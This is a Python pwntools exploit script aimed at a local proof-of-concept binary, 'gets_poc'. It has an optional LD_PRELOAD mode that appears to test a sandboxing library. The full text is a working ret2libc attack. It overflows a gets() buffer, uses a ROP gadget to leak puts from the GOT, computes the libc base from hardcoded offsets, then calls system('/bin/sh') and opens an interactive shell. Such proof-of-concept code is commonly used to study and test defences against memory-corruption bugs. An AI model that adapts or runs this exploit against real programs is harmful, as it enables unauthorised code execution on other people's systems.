import sys
from pwn import *

elf = ELF('./gets_poc')
inject = ELF('basecc-gets_poc.so')

if len(sys.argv) > 1 and sys.argv[1] == "sandbox":
    p = process('./gets_poc', env={'LD_PRELOAD':inject.path})
else:
    p = process('./gets_poc')

#gdb.attach(p, '')

puts_plt = 0x401030
puts_got = 0x404018
pop_rdi = 0x40113a
vuln = 0x40113f

payload = b"A"*0x38
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(vuln)
p.sendlineafter(b"name?", payload)

p.recvline()
p.recvline()

# offsets will be different for your libc
puts_offset = 0x7b5a0
system_offset = 0x4f230
binsh_offset = 0x1bd115

leak = u64(p.recv(6).ljust(8, b'\x00')) - puts_offset
log.info("got libc leak... " + hex(leak))

payload = b"A"*0x38
payload += p64(pop_rdi)
payload += p64(leak + binsh_offset)
payload += p64(leak + system_offset)
p.sendlineafter(b"name?", payload)

p.recvline()
p.recvline()
log.info("got shell :)")

p.interactive()
